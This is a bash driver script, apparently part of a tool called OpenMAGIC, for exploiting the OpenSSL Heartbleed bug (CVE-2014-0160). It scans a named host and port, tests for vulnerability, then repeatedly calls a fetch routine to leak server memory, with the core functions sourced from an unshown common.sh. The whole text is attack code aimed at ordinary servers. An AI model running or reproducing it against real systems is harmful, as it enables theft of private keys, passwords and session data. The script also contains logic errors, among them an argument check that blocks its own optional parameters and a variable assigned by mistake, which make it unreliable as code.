#!/bin/bash
# OpenMAGIC v0.3
#
# OpenSSL TLS heartbeat read overrun (CVE-2014-0160)
# Written by Francesco `ascii` Ongaro - 20140218
# (C) ISGroup SRL - http://www.isgroup.biz

. ./common.sh

if [ $# -ne 2 ]; then
	echo "Usage: $0 hostname port"
	echo "       $0 ip port"
	exit 0
fi

TARGET=$1
PORT=$2

MAX=1000
if [ ! -z "$3" ]; then
	MAX=$3
fi

SLEEP=1
if [ ! -z "$4" ]; then
	MAX=$4
fi

a $TARGET | while read IP; do
	if alive $IP $PORT; then
		echo "# [Open  ] $IP:$PORT ($TARGET)"
		if vulnerable $IP $PORT; then
			echo "* [Vuln  ] $IP:$PORT ($TARGET)"
			for c in `seq 1 $MAX`; do
				fetch $TARGET $IP $PORT $c
				echo "# [Loop  ] $IP:$PORT ($TARGET) %$c"
				sleep $SLEEP
			done
		else
			echo "# [Safe  ] $IP:$PORT ($TARGET)"
		fi
	else
		echo "# [Closed] $IP:$PORT ($TARGET)"
	fi
done
